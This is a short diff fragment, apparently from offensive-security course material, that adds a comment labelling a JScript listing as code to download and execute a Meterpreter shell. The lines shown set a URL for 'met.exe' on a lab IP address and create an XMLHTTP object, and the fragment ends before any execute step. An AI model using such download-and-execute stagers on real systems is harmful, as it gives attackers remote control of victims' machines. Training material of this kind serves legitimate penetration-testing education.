@@ -1,3 +1,5 @@
+// 4.1.2 - Listing 8 - Complete Jscript code to download and execute Meterpreter shell
+
 var url = "http://192.168.45.193/met.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
 
